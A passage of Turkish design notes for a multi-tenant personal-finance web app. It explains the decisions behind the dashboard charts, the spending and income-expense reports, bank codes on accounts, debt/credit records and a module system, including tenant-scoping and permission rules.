`CurrencyFlow.net` **pozitiftir**; yönü `netDirection: "in" | "out"` taşır. Bu, kod tabanının
kendi kuralının (`Transaction.amount` daima pozitif, yönü `type` taşır — #53) özet katmanındaki
karşılığıdır. Alternatif olan işaretli tek bir string, sunum katmanını "başında `-` var mı" diye
string kesmeye ya da `Money` bileşenine ikinci bir eksi bastırmaya zorlardı.

### Grafik: yeni bağımlılık yok, oran serviste hesaplanır

Grafik **HTML/CSS çubuklarıdır**; Recharts/Chart.js gibi bir kütüphane eklenmedi. Gerekçe: tek
bir grafik için onlarca kilobayt JavaScript ve bir `"use client"` sınırı; oysa bu grafik
sunucuda render edilir, JavaScript'siz çalışır ve yazdırılabilir. (Yeni bağımlılık zaten açık
onay ister — CLAUDE.md §4.) Etkileşim gerektiğinde (zoom, tooltip, seri gizleme) karar yeniden
gözden geçirilmelidir.

**Çubuk yükseklikleri sunum katmanında hesaplanmaz.** Bileşen hazır yüzde *string*'leri alır ve
doğrudan CSS'e yazar; oran `Prisma.Decimal` ile serviste üretilir. Yüksekliği bileşende
hesaplamak `Number(income) / Number(max)` demekti — yani paranın kayan noktaya dönmesi.

Gelir ve gider **ortak ölçekte** normalize edilir: ayrı ayrı normalize edilseydi 100 TRY gelir
ile 10.000 TRY gider aynı yükseklikte çubuk olurdu ve grafik yalan söylerdi. Sıfır değerli bir
ay görünmez bir çubuk değil, tabanda ince bir iz bırakır — "veri yok" ile "değer sıfır" ancak
böyle ayrışır. Grafiğin ekran okuyucu metni ayın gerçek rakamlarını taşır; dekoratif bir çizim
değildir.

Hareketi hiç olmayan bir para birimi **trende girmez**: altı ay boyunca sıfır olan bir grafik
bilgi değil gürültüdür. (Bakiyede görünmeye devam eder.)

### Onboarding: sahte veri yerine yapılacak iş

Hiç işlemi olmayan çalışma alanında akış panelleri ve "son hareketler" **hiç render edilmez**;
yerine üç adımlı bir yönlendirme gelir: hesap → kategori → işlem. Sıra zorunlu bir bağımlılıktır,
süsleme değil: bir işlem bir hesaba bağlanmak zorundadır (`accountId` zorunlu alan).

**Örnek/demo rakam gösterilmez.** Kullanıcının kendi parasıyla karıştırabileceği bir sayı,
boş bir ekrandan kötüdür. Aynı nedenle sayımlar sıfırken de gerçek gösterilir ("Hesap 0").

Aynı anda **tek bir eylem** vurgulanır (ilk tamamlanmamış adım); üç düğme birden, "hangisinden
başlayacağım" sorusunu geri getirirdi. Eylem yetkiye bağlıdır (`EmptyState` ile aynı duruş):
MEMBER'a kesin 403 alacağı bir yola "başla" demek yardım değil tuzaktır — bunun yerine yetki
isteme notu gösterilir.

### Yetki: tek bir izin yetmez

Özet üç modelin verisini birlikte açar. Hem route hem sayfa, **üç görüntüleme izninin tamamını**
arar (`VIEW_ACCOUNTS` + `VIEW_TRANSACTIONS` + `VIEW_CATEGORIES`). Bugün üç rolün üçü de bunlara
sahip; kontrol matris değiştiğinde anlam kazanır — aksi halde bu endpoint, sessizce fazla veri
sızdıran yer olurdu.

`GET` yan etkisizdir (invariant #4) ve modül **salt okunurdur**: `dashboard.ts`'te tek bir yazma
çağrısı yoktur, bunu `integration/tenant-scope-pattern.spec.ts` statik olarak doğrular. Aynı
dosya, bu modüldeki **istisnasız her `where`'in** `tenantScoped()` üzerinden geçtiğini de
kontrol eder — scope'u kaçırılmış bir `count`/`groupBy`, hiçbir kaydı bozmadan başka
tenant'ların bakiyelerini ve ciro büyüklüğünü sızdırırdı, üstelik sessizce.

### Bilinen sınırlar

- **Kur dönüşümü yok** — yukarıdaki kararın kaynağı. Çok para birimli bir çalışma alanı, para
  birimi sayısı kadar kart ve grafik görür; sayı arttıkça ekran uzar.
- **Saat dilimi yok (#134)** — ay sınırları UTC.
- **Kategori bazlı dağılım yok** (#65) ve **dönemsel rapor yok** (#67); panel bunların yerini
  tutmaz.
- **Trend penceresi sabit altı aydır**, istemciden ayarlanamaz (`?months=` yoktur) — sayfa
  boyutu kararıyla (#135) aynı gerekçe: kapatmak açmaktan zordur.
- **Binlik ayırıcı hâlâ yok**; `Money` ham string basar (#47'den beri kayıtlı borç).
- **Ay başına bir `groupBy` sorgusu** koşar (altı paralel sorgu). Tek sorguda ay kırılımı
  `date_trunc` isterdi, o da ham SQL demek. Ölçülmüş bir sorun yok; olursa çare bir
  materialized özet değil, `Transaction`a denormalize bir `currency` alanı olabilir.

## Kategori bazlı harcama dağılımı (Issue #65)

Panelde, seçilen dönemin **gider** dağılımı: para birimi başına bir halka (donut) + yanında ad,
pay ve tutarı taşıyan lejant. Hesaplama `src/lib/finance/spending-by-category.ts`, HTTP yüzeyi
`GET /api/tenants/:tenantId/dashboard/spending-by-category?from=&to=`.

**Migration YOK** — #62/#63 ile aynı: dağılım mevcut kayıtlardan türetiliyor.

### Issue'nun "grafik kütüphanesi ekle" gereksinimi BİLEREK uygulanmadı

#64/#65'in teknik notu "hafif bir grafik kütüphanesi eklenir (gerekçelendirilerek)" diyordu.
Eklenmedi. Gerekçe:

1. #63'te trend grafiği zaten **bağımlılıksız** çözüldü; bir kütüphane getirmek aynı ekranda
   iki farklı grafik motoru bırakırdı.
2. Yeni bağımlılık **açık onay** gerektirir (CLAUDE.md §4) ve bu halka için gereken tek şey
   SVG'nin kendi `stroke-dasharray`ıdır.
3. Kütüphaneler bir `"use client"` sınırı getirir; bu grafik sunucuda render edilir ve
   JavaScript'siz çalışır.

Karar **geri alınabilir ve geri alınmalıdır** grafik etkileşimli olması gerektiğinde (tooltip,
tıklanabilir dilim, animasyonlu geçiş, zoom). O gün geldiğinde tek bir kütüphane seçilip **her
iki** grafik birden taşınmalıdır.

### `pathLength={100}` — bileşende tek bir aritmetik işlem yok

SVG'nin `pathLength` özniteliği, çemberin gerçek uzunluğunu 100 birime **normalize eder**.
Böylece `strokeDasharray`/`strokeDashoffset` doğrudan **yüzde** olarak yazılabilir; `2πr` hesabı
hiç gerekmez. Bileşen, servisten gelen yüzde string'lerini olduğu gibi SVG'ye geçirir —
#63'teki kararın aynısı: oranı sunum katmanında hesaplamak `Number(amount) / Number(total)`
demekti, yani paranın kayan noktaya dönmesi (invariant #10).

**Ofset kümülatif toplamı TAM değerlerden üretilir**, yuvarlanmış payların toplamından değil:
üç eşit dilimde (33.33 + 33.33) son dilim 66.66'da başlar ve halkada gözle görülür bir kayma
kalırdı; doğrusu 66.67'dir. Testi: `integration/spending-by-category.spec.ts`.

### Yalnızca gider; para birimleri yine ayrı

`type: EXPENSE` bir varsayılan değil **tanımın kendisidir**: gelirleri de aynı halkaya koymak
"harcamanın %40'ı kira" gibi her cümleyi anlamsızlaştırırdı — pay ve payda farklı şeyler olurdu.

Para birimi ayrımı #62'nin kararının aynısı ve aynı gerekçeyle: kur dönüşümü yok, TRY ve USD
harcamaları tek dağılımda toplanamaz. Aynı kategori iki para biriminde de %100 olabilir; **pay
daima kendi para biriminin toplamına göredir.**

### Kategorisiz dilim

`categoryId: null` iki durumu birleştirir: kategori hiç seçilmemiş ya da kategori sonradan
**silinmiş** (`onDelete: SetNull`, #53). Kullanıcı açısından ikisi de "bu harcama
sınıflandırılmamış"tır; ayrı göstermek olmayan bir ayrımı icat etmek olurdu. Silinen bir
kategorinin harcaması **kaybolmaz** — kategori bir etikettir, paranın kendisi değil.

Sıralama tutara göre azalandır; eşitlikte ada göre ve **kategorisiz daima sona** düşer (adı
yoktur). `localeCompare` kullanılmaz — sıra ICU sürümüne bağlı olmamalı.

### Renk: sıraya göre, `CategoryBadge`'in aksine ada göre değil

Rozet listenin içinde tek başına durur ve rengi bir **kimlik** ipucudur, bu yüzden ada göre
hash'lenir ve her ekranda aynı kalır. Halkada ise renk **sıra** taşır ve hemen yanındaki lejant
renkleri adlarla zaten eşler; ada göre hash, yan yana gelen iki dilimin aynı rengi almasına izin
verir ve halka okunamaz hâle gelirdi. `danger` rampası havuzda **yok**: kırmızı bu sistemde
hatanın rengidir, rastgele bir gider kategorisinin değil.

### Dönem: URL'de, ayrıştırıcı `/transactions` ile ORTAK

Dönem `?from=&to=` olarak URL'de yaşar (düz `<form method="get">`, client component değil) —
#56'nın kararının aynısı: sonuç paylaşılabilir, geri tuşu çalışır, hiç istemci JavaScript'i
gerekmez ve `GET` yan etkisiz kalır.

**Ayrıştırıcı ortaktır** (`parseTransactionFilters`): aynı biçim (`YYYY-MM-DD`), aynı
"tekrarlanan parametre hatadır", aynı "ters aralık 400'dür" kuralı. İşlem listesine özgü
filtreler (`accountId`, `q`, `after`) bu endpoint'e hiç sorulmaz, dolayısıyla sessizce yok
sayılırlar. `nextDay()` de artık **dışa açık ve ortaktır** (`transaction.ts`): "15 Mart'a kadar"
iki ekranda iki farklı sonuç vermemeli.

**Varsayılan: içinde bulunulan ayın tamamı** (UTC). "Son 30 gün" reddedildi — hemen üstteki özet
"bu ay" diyor ve iki bölümün farklı dönem göstermesi, aynı ekranda birbirini yalanlayan iki sayı
üretirdi.

**Aralık kısmen verilebilir**; eksik uç varsayılandan tamamlanır. Ters aralık kontrolü
**birleştirmeden sonra da** yapılır: ayrıştırıcı yalnızca ikisi de verildiğinde bakabilir, oysa
`?from=2099-01-01` + varsayılan `to` de ters aralık üretir. Sessizce boş dağılım göstermek
kullanıcıya "bu dönemde harcama yok" dedirtirdi; oysa sorun filtrededir.

### Yetki ve erişilebilirlik

`dashboard/summary` ile aynı kural: üç görüntüleme izninin tamamı aranır. **Bu endpoint'e özgü
ek yüzey kategori ADLARIDIR** — bir tenant'ın gider kategorileri ("Avukat", "Tazminat") tek
başına ticari bilgidir; tutarlar sızmasa bile adların sızması ihlaldir, ve güvenlik testi bunu
ayrıca doğrular.

Halka `aria-hidden`dır: tek başına hiçbir şey söylemez. Veriyi taşıyan şey yanındaki
**listedir** — gerçek metin, gerçek tutar, gerçek yüzde. Bölümün kendisi `aria-labelledby` ile
adlandırılmış bir **landmark**tır (kendi formu, dönemi ve iki grafiği olan en karmaşık bölüm).

### Bilinen sınırlar

- **Yedi renkli havuz**; daha fazla kategoride renkler tekrar eder. Lejant adlarla ayırır, ama
  yan yana iki eşit renk mümkündür. Çare (üst N + "Diğer" kovası) bilinçli olarak ertelendi:
  gerçek bir dağılımı gizler.
- **Gelir dağılımı yok** — bu bölüm tanımı gereği yalnızca giderdir.
- **Kategori kırılımı zaman içinde gösterilmiyor** (kategori × ay); dönemsel rapor #67'nin işi.
- **Saat dilimi yok (#134)** — varsayılan aralık UTC ay sınırlarıyla kurulur.
- **Dilime tıklayıp işlemleri filtrelemek yok**; `/transactions` zaten aynı `?from=&to=` ve
  `?categoryId=` filtrelerini destekliyor, bağlantı kurmak ayrı bir adım.

## Dönemsel gelir-gider raporu (Issue #67)

`/reports` ekranı ve `GET /api/tenants/:tenantId/reports/income-expense?from=&to=`. Seçilen
dönem için para birimi başına: **gelir / gider / fark / işlem sayısı**, **kategori kırılımı**
(gelir ve gider ayrı tablolar) ve **hesap kırılımı**. Hesaplama
`src/lib/finance/income-expense-report.ts`.

**Migration YOK** — rapor mevcut kayıtlardan türetiliyor.

Sidebar'daki "Raporlar" öğesi bu issue ile placeholder olmaktan çıkıp gerçek bir bağlantıya
dönüştü (`#63` → `#67`); `e2e/app-shell.spec.ts`'teki "placeholder'lar link olmasın" kontrolü,
kendi notunun söylediği gibi hâlâ placeholder olan bir öğeye ("Ayarlar", #86) taşındı ve yanına
bir **kontrol grubu** eklendi (gerçek ekranlar link OLMALI).

### Panelden farkı — ve neden ay kırılımı yok

Panel "şu an durum ne" der (bu ay, son altı ay, sabit pencereler). Rapor "**seçtiğim dönemde ne
oldu**" der. Ekranın tamamı tek bir dönemi anlatır.

**Ay bazlı satırlar bilerek yok.** Ay kırılımı ya `date_trunc` ister (ham SQL yasak) ya da ay
başına bir sorgu — panelin **sabit** altı ayında kabul edilebilir, ama burada aralık
**serbesttir**: beş yıllık bir dönem altmış sorgu demek olurdu. Panelde zaten son altı ayın
trendi var (#63). Gerekirse ayrı bir issue: sınırlı bir ay sayısı + açık bir üst sınır.

### Tek bir aggregate sorgusu

`groupBy(["accountId", "categoryId", "type"])` bu raporun ihtiyaç duyduğu **her** kırılımı aynı
anda üretir: toplamlar, kategori kırılımı, hesap kırılımı ve yön ayrımı. `_count` ile işlem
adedi de aynı sorgudan gelir. Para birimi yine `Account.currency`den katlanır (#62'nin kararı);
`number`a hiçbir noktada dönüşülmez.

### Paylar KENDİ YÖNÜNÜN toplamına göredir

Gelir kategorisinin payı **gelir toplamına**, gider kategorisininki **gider toplamına**
oranlanır — genel toplama değil. Aksi halde "maaş gelirin %100'ü" yerine "maaş her şeyin %71'i"
gibi hiçbir soruyu yanıtlamayan bir sayı çıkardı. Testi:
`integration/income-expense-report.spec.ts`.

Aynı adı taşıyan gelir ve gider kategorileri **karışmaz** (şema `@@unique([tenantId, type,
name])` — "Diğer" iki tarafta da olabilir, #49).

### Hesap kırılımı ADA göre sıralanır

Kategori kırılımında soru "en büyük kalem hangisi" (tutara göre azalan). Hesap kırılımında soru
"şu hesapta ne oldu" — ad, aranan satırı bulmanın en hızlı yoludur ve **dönem değiştikçe sıra
oynamaz**. Rapor içi tutarlılık ayrıca test ediliyor: hesap kırılımının adet toplamı, para
biriminin toplam adedine eşit.

### `src/lib/finance/aggregation.ts` — paylaşılan dönem kuralları

Üçüncü toplama modülü eklenirken aynı üç soru üç ayrı yerde soruluyordu: *dönem nedir*, *bir
tutar toplamın yüzde kaçıdır*, *satırlar hangi sırada*. Üç kopya zamanla üç farklı cevaba
dönüşür ve bu, kullanıcının fark etmesi en zor hata türüdür (iki ekran aynı veriden iki farklı
sayı gösterir). Bu yüzden ortaklaştırıldı:

- `currentMonthRange()` — varsayılan dönem (UTC ayın tamamı). `defaultSpendingRange()` artık
  bunun anlamlı adlı sarmalayıcısı.
- `resolveDateRange(get, fallback)` — `?from=&to=` çözümünün **tek** tanımı: ortak ayrıştırıcı
  (`parseTransactionFilters`, #56), kısmi aralığın varsayılanla tamamlanması ve
  **birleştirmeden sonraki** ters aralık kontrolü. Panel, harcama dağılımı ve rapor aynı kodu
  çağırır.
- `percentOf()`, `compareByAmountThenName()`, `compareCurrencyCode()`, `toIsoDate()`.

Modül tenant, HTTP ve Prisma sorgusu **bilmez**; yalnızca saf kurallardır. Bir "utils" çöplüğü
değildir ve olmamalıdır: buraya yalnızca **birden fazla** toplama modülünün paylaştığı, saf ve
test edilebilir kurallar girer.

`DateRangeForm` de aynı gerekçeyle paylaşıldı (`src/components/ui/date-range-form.tsx`): panelin
harcama dönemi ile raporun dönemi aynı formdur, `action` ve `idPrefix` ile ayrışır. `idPrefix`
zorunludur — aynı sayfada ikinci bir dönem formu belirdiğinde `id`ler çakışır ve `<label for>`
bağlantısı sessizce yanlış alana giderdi.

### Bilinen sınırlar

- **Ay/çeyrek kırılımı yok** (yukarıdaki gerekçe).
- **Rapor export'u yok** — Epic 10 (#81).
- **Karşılaştırma yok** ("geçen döneme göre %x"): ikinci bir dönem ve bir değişim tanımı ister.
- **Saat dilimi yok (#134)** — varsayılan dönem UTC ay sınırlarıyla kurulur.
- **Kategori kırılımı gider tarafında #65 ile örtüşür.** Kasıtlı: #65 panelde, sabit görsel bir
  dağılım (halka); rapor ise seçilen dönemde iki yönü de tablo olarak verir. Ortak olan
  hesaplama değil yalnızca kavramdır — iki modül ayrı sorular yanıtlıyor.

## Hesabın bankası (Issue #148)

Hesap türü **Banka** seçildiğinde hangi banka olduğu da seçilir. `Account.bankCode` alanı,
`src/lib/finance/banks.ts` içindeki liste ve hesap formundaki koşullu seçici.

**Migration VAR** ve tek satırdır: `ALTER TABLE "Account" ADD COLUMN "bankCode" TEXT;` —
nullable, eklemeli, veri kaybı yok.

### Enum değil `String?`, ad değil KOD

`AccountType`/`CategoryType` **enum**dur çünkü kümeleri küçük ve **kararlıdır**. Banka listesi
ikisi de değildir: birleşmeler, yeni lisanslar ve marka değişimleri olur. Enum yapmak **her
banka değişikliğinde bir migration** demekti — `AuditLog.action`'daki serbest `String`
tercihiyle aynı gerekçe.

Saklanan değer **koddur** (`ZIRAAT`, `GARANTI`), görünen ad değil: "Garanti" → "Garanti BBVA"
gibi bir marka değişimi veri migration'ı gerektirmemeli. API de **kod** taşır; ad yalnızca
sunum katmanında çözülür.

**Serbest metin kabul edilmez.** Kullanıcı yazsaydı "Garanti", "garanti bankası" ve "TGB" üç
ayrı banka olurdu ve banka bazlı herhangi bir gruplama sonsuza dek imkânsızlaşırdı. Doğrulama
bir **allowlist**tir; `isValidBankCode` yalnızca tam eşleşmeyi kabul eder (küçük harf, boşluklu
ya da uydurma değer `400`).

### Zorunluluk ARAYÜZDE, sözleşmede değil

Kullanıcının kastı net: "banka" dediyse hangi banka olduğu da bilinmeli. Ama alanı **API'de
zorunlu** yapmak iki şeyi kırardı: mevcut istemcileri ve **#148 öncesinde oluşturulmuş**
(bankası `null`) satırları. Bu yüzden:

- **Form** banka seçilmeden göndermez (`noValidate` olduğu için kontrol elle yapılır).
- **API** alansız `BANK` hesabı kabul etmeye devam eder ve `bankCode: null` "belirtilmedi"
  demektir — `balance`taki katı `null` reddinin aksine, çünkü "bankası belirtilmemiş banka
  hesabı" meşru bir durumdur.

Veri geriye dönük doldurulduğunda sözleşmenin de sıkılaştırılması ayrı bir karardır.

### `bankCode` yalnızca `BANK` türünde anlamlıdır

- `CASH` hesapta banka göndermek **`400`** — sessizce yok saymak, kullanıcının seçtiği bankanın
  kaybolduğu bir kayıt üretirdi.
- Tür `CASH`'e çevrilince banka **otomatik temizlenir**, istemci göndermese bile. Aksi halde
  kasa hâline gelmiş bir hesapta eski kod asılı kalır ve ileride banka bazlı her toplama onu
  sayardı.
- Tür bu istekte verilmemişse etkin tür **kayıttan okunur** (`tenantScoped()` ile), aksi halde
  bir kasa hesabına banka yazılabilirdi.

**Kabul edilen yarış:** okuma ile yazma arasında biri türü `CASH`'e çevirirse kasa hesabında
banka kodu kalabilir. Bu bir **etiket** tutarsızlığıdır, para hareketi değil; kapatmak
`Serializable` bir transaction gerektirirdi ve bedeli faydasını aşardı (karşılaştır:
`transaction.ts`'teki bakiye yazımı — orada gerçekten para söz konusu).

### Liste elle bakılır — ve "Diğer" seçeneği kaldırılmamalıdır

`banks.ts` bir **anlık görüntüdür** ve BDDK'nın güncel listesine göre periyodik olarak
doğrulanmalıdır. Kod tabanı bunu otomatik doğrulayamaz: canlı bir kaynak sorgulamak yeni bir
bağımlılık ve çalışma zamanı ağ çağrısı demekti.

Bu yüzden **"Diğer"** seçeneği vardır: listedeki bir eksik, kullanıcının hesabını hiç
kaydedememesinden çok daha küçük bir sorundur. Testler listenin kendi tutarlılığını zorlar
(kodlar benzersiz, her banka bir grupta, gruplama hiçbir bankayı düşürmüyor, "Diğer" duruyor).

**Markalar listede yoktur** (Enpara → QNB, CEPTETEB → TEB): bunlar ayrı bir banka değil, mevcut
bir bankanın ürün markasıdır; marka satırı eklemek aynı bankanın hesaplarını iki ayrı kova gibi
gösterirdi. Kullanıcı ayrımı hesap adında yapabilir.

### Arayüz

Seçici **yalnızca tür "Banka" iken render edilir**; kasada alanı devre dışı bırakıp göstermek
"burada bir şey eksik" hissi verirdi. Tür kasaya çevrilince yerel seçim **sıfırlanmaz**, yalnızca
gönderilmez — kullanıcı yanlışlıkla tür değiştirip geri dönerse seçimini yeniden yapmak zorunda
kalmamalı.

Uzun liste **gruplanmış** (`optgroup`) gelir; boş "Seçiniz" seçeneği korunur çünkü ilk bankayı
varsayılan yapmak, kullanıcı hiç dokunmadığında sessizce yanlış bir banka kaydederdi. Listede
banka **adı** rozet olarak türün yanında görünür — kasa hesaplarında hep boş kalacak ayrı bir
kolon, tabloyu her satırda genişletirdi.

### Bilinen sınırlar

- **Liste güncelliği elle korunur** (yukarıdaki gerekçe).
- **IBAN / hesap numarası yok** — hassas veri; maskeleme, doğrulama ve ayrı bir yetki kararı
  gerektirir.
- **Banka bazlı raporlama yok**; alan bugün yalnızca etiketleme amaçlıdır.
- **Eski kayıtlar `null` kalır**; toplu doldurma (backfill) yapılmadı — kullanıcı düzenlerken
  form zaten seçim yaptırıyor.

## Borç/Alacak (Issue #70)

`/debt-credits` ekranı ve `GET/POST /api/tenants/:tenantId/debt-credits` +
`PATCH/DELETE .../:debtCreditId`. "Kime ne kadar borçluyum / kimden ne kadar alacağım", vade ve
açık/kapandı durumu. Hesaplama katmanı `src/lib/finance/debt-credit.ts`.

**Migration VAR:** iki enum (`DebtCreditType`, `DebtCreditStatus`) ve bir tablo. Eklemeli, veri
kaybı yok.

### `Transaction`dan farkı: para HENÜZ HAREKET ETMEMİŞTİR

Bir borç/alacak kaydı **hiçbir hesabın bakiyesini değiştirmez** ve `Account` ile ilişkisi
yoktur. Bu yüzden burada `transaction.ts`'in bakiye/`Serializable` karmaşıklığı **yoktur**.

**"Kapandı" işareti otomatik bir işlem üretmez.** Bir borcu `SETTLED` yapmak o ödemeyi
kaydetmez; kullanıcı ödemeyi ayrıca işlem olarak girer. Otomatik üretmek kulağa yardımcı gelir
ama *hangi hesaptan, hangi tarihte, hangi kategoriyle* sorularının cevabı yoktur — uydurulmuş
bir işlem bakiyeyi sessizce bozardı. Form bunu kullanıcıya da yazıyla söyler.

### `currency` alanı issue'nun listesinde yoktu — bilerek eklendi

#70 alan listesinde para birimi yoktu. Eklendi, çünkü invariant #10 bunu **zorunlu kılar**:
para birimi olmayan bir tutar üründeki hiçbir ekranda güvenle gösterilemez (panelin çok para
birimli kararlarının tamamı bunun üzerine kuruludur). Kur dönüşümü yine yok; ileride toplam
alınırsa para birimi bazında ayrılacak.

### Tutar pozitif, yönü `type` taşır

`Transaction.amount` ile **birebir aynı kural** (#53): negatif bir `DEBT`, kılık değiştirmiş bir
alacak olurdu ve her toplamı bozardı; sıfır ise kayıt değil gürültü. Arayüz de bunu söyler
("yön tür alanından gelir, eksi yazılmaz") ve tür etiketleri yönü **açıkça** yazar — "Borç (ben
borçluyum)" / "Alacak (bana borçlular) —, çünkü "Borç"/"Alacak" sözcükleri tek başına düzenli
olarak ters okunuyor.

### Durum geçişi İKİ YÖNLÜDÜR

`OPEN → SETTLED` ve `SETTLED → OPEN`. Geri dönüşü yasaklamak, yanlışlıkla "kapandı"
işaretlenen bir kaydı düzeltmenin tek yolunu **silip yeniden oluşturmak** yapardı — kaydın
oluşturulma tarihi ve audit izi kaybolurdu. Her iki geçiş de audit log'a düşer ve `status`
**değeriyle** yazılır (hangi yöne geçildiği alan adından okunamaz).

Ara durum (`PARTIAL`) **bilerek yok**: kısmi ödeme, kalan tutarın ne olduğunu ve ödemelerin
nerede tutulacağını sorar — yani ayrı bir "ödeme" kaydı ve bakiye mantığı demektir. Eklenirse
enum'a bir değer eklemek yetmez, yeni bir model gerekir.

### Vade opsiyoneldir; gecikme bir uyarıdır, bildirim değil

"Borçluyum ama tarihi belli değil" meşru bir kayıttır; kullanıcıyı uydurma bir tarih girmeye
zorlamak veriyi sessizce bozardı. Vade gün hassasiyetinde (UTC gece yarısı) saklanır ve
`parseCalendarDate` ile doğrulanır — **aralık filtreleriyle (#56) aynı fonksiyon**, çünkü ikisi
de saat taşımayan takvimsel kavramlardır.

Vadesi geçmiş **açık** kayıtlar listede "Gecikmiş" rozetiyle işaretlenir. Kapanmış olanlar
işaretlenmez — iş bitmiştir, kırmızı bir rozet yalnızca gürültü olurdu. **Otomatik hatırlatma
yoktur** (#70'in kendi "Scope Dışı" notu + Epic 9).

### Sıralama ekranın işidir

Önce **açık** kayıtlar, sonra **vadesi yakın** olanlar, vadesizler ise vadelilerin **ardında**
(`nulls: "last"`). Bu listeye bakan kişi "neyi ödemem/tahsil etmem gerek" sorusunu sorar;
tarihi olmayan bir kayıt, tarihi geçmiş bir kaydın önüne geçmemeli.

### Yetki

Yeni izinler: `VIEW_DEBT_CREDITS` / `MANAGE_DEBT_CREDITS`. Hesap/kategori/işlemle **aynı
ayrım**: bir yükümlülüğü görmek ekibin günlük işidir; kaydetmek, tutarını düşürmek ya da
"kapandı" işaretlemek yönetim işidir. Özellikle **"kapandı" işareti, ödenmemiş bir borcu
ödenmiş göstermenin en kolay yoludur** — ve hiçbir bakiye değişmediği için hesap ekranlarında
iz bırakmaz. Bu yüzden MEMBER'a verilmez.

Durum değişimi için **ayrı bir endpoint yoktur** (`POST .../settle` gibi): "kapandı" kaydın bir
alanıdır ve diğer alanlarla aynı yoldan güncellenir; ayrı endpoint aynı yetki ve izolasyon
kontrollerinin ikinci bir kopyasını doğururdu.

### Bilinen sınırlar

- **Toplam gösterilmiyor** ("toplam borcum ne kadar"): para birimi bazında ayrılmış bir toplama
  gerektirir ve bu, sunum katmanına değil `src/lib/finance` içine ait bir iş kuralıdır.
  İstenirse panel özeti gibi ayrı bir serviste yapılmalı.
- **Panele bağlanmadı**; borç/alacak bugün yalnızca kendi ekranında yaşıyor.
- **Sayfalama yok** (`account.ts`/`category.ts` ile aynı duruş): bu liste, işlem listesi gibi
  sınırsız büyüyen bir kayıt akışı değil, elle tutulan kısa bir listedir. Gerekirse #135'in
  keyset deseni buraya da uygulanır.
- **Kısmi ödeme yok** (yukarıdaki `PARTIAL` gerekçesi).
- **Karşı taraf serbest metindir**; kişi/kurum rehberi (`Contact`) ayrı bir kavram ve ayrı bir
  issue.
- **Saat dilimi yok (#134)** — vade ve "bugün" karşılaştırması UTC.

## Modül sistemi — çekirdek (Issue #151)

Ürünü "ham çekirdek + müşteriye göre açılan modüller" hâline getiren temel.
`GET /api/tenants/:tenantId/modules` ve `PATCH .../modules/:moduleKey`.

**Kural:** hangi modüllerin **var olduğunu kod** bilir (`src/lib/modules/catalog.ts`), hangi
tenant'ta hangisinin **açık olduğunu veritabanı** bilir (`TenantModule`). Bu ayrım, modül
tanımının (izinler, bağımlılıklar, menü) kod incelemesinden geçmesini ve derleme zamanında tip
denetlenmesini sağlar.

**Migration VAR:** tek tablo, eklemeli, veri kaybı yok.

### Satırın YOKLUĞU = modül kapalı

Migration sonrası **hiçbir mevcut tenant etkilenmez**: kimseye satır yazılmaz, kimsede yeni bir
ekran belirmez. `credentialsChangedAt`'ın nullable olmasıyla aynı mantık — "hiç dokunulmamış"
durumu temsil edilebilir olmalı.

`GET` bunu **tembel kurulumla bozmaz**: liste katalog + DB birleştirilerek üretilir, eksik
satırlar oluşturulmaz. Yan etkili bir `GET`, CSRF korumasının dayandığı invariant'ı (#4) bu
endpoint için ortadan kaldırırdı.

### `moduleKey` String, Prisma enum değil

`AuditLog.action` ve `Account.bankCode` ile aynı gerekçe: yeni modül eklemek migration
gerektirmemeli. Tip güvenliği uygulama katmanındaki `ModuleKey` union'ı ile sağlanır.
Katalogda olmayan bir anahtar **yazarken 400** ile reddedilir, **okurken sessizce yok sayılır**
— katalogdan kaldırılmış eski bir satır uygulamayı kırmamalı.

`MODULE_CATALOG` bir `Record<ModuleKey, ModuleDefinition>`tir: yeni bir anahtar eklendiğinde
tanımını yazmayı **derleme zamanında** zorunlu kılar (rol→izin matrisiyle aynı gerekçe).

### Bağımlılık OTOMATİK AÇILMAZ — ve kural simetriktir

`collections` → `dependsOn: ["crm"]`.

- **Açarken** bağımlılık kapalıysa **409**. Sessizce `crm`'i de açmak, tenant'ın ürün yüzeyini
  kullanıcının istemediği bir şekilde genişletirdi — **kullanıcı ne açtığını bilmelidir.**
- **Kapatırken** buna bağımlı **açık** bir modül varsa **409**. (Kapalı bir bağımlı engel
  değildir; kural "açık olan bağımlı" üzerinedir.)

Kontrol **okumaya bağlı bir invariant** olduğu için `runSerializable()` içinde yapılır: iki
eşzamanlı istek — biri `crm`'i kapatırken diğeri `collections`'ı açarsa — ayrı ayrı okuyup ikisi
de geçerli görebilir ve sonuçta `collections` açık, `crm` kapalı kalırdı. `prisma.$transaction`
+ `Serializable`'ı **doğrudan** çağırmak yetmez: serialization failure'da retry atlanır ve
kullanıcı 500 alır (#122). Retry tükenirse **503** döner — `409` değil, çünkü bu bir iş kuralı
ihlali değil geçici bir sunucu durumudur.

Yazma `upsert` + `@@unique([tenantId, moduleKey])` ile yapılır; "önce var mı diye bak sonra yaz"
yarışı DB seviyesinde kapalıdır.

Katalogun kendi tutarlılığı da test edilir: anahtar/tanım eşleşmesi, bağımlılıkların var olan
anahtarlara işaret etmesi ve **bağımlılık grafiğinin döngüsüz** olması (iki modül birbirine
bağımlı olsaydı ikisi de kalıcı olarak kapalı kalırdı).

### Yetki: yönetim yalnız OWNER

- `VIEW_MODULES` → OWNER, ADMIN, MEMBER. Menüyü kurabilmek için hangi modüllerin açık olduğunu
  bilmek gerekir ve bu bilgi bir sır değildir; modülün **içeriği** elbette kendi izinleriyle
  korunur.
- `MANAGE_MODULES` → **yalnız OWNER**. Bu, matristeki genel "OWNER+ADMIN yönetir" kalıbının
  **bilinçli istisnasıdır**: bir modülü açmak tenant'ın ürün yüzeyini değiştirir (yeni ekranlar,
  yeni izinler, yeni veri) ve bu, `UPDATE_TENANT_SETTINGS` ile aynı sınıfta bir karardır.
  Güvenlik testi ADMIN'in de reddedildiğini ayrıca doğrular.

Audit log'da `targetType: "MODULE"` ve `targetId` bir satır id'si **değil modül anahtarıdır**:
kayıt, satır silinse bile anlamlı kalmalı. Reddedilen istek audit **yazmaz**.

### Bilinen sınırlar / sonraki adımlar

- **Guard yok** — açık olmayan bir modülün API'lerini ve sayfalarını engelleyen katman #152.
  Bugün katalogdaki iki modülün hiçbir ekranı/izni olmadığı için ortada korunacak bir yüzey de
  yok.
- **UI yok** (#153: `/settings/modules`).
- **Seed yok** (#154: modül açılınca varsayılan veri kurulumu; `seededAt` alanı onun içindir).
- **`permissions` ve `nav` katalog alanları BOŞ** ve bu bilinçli: ilgili modülün izinleri ve
  ekranları kendi issue'larında (#156+, #165+) doğduğunda doldurulacak. Bugün uydurma izin
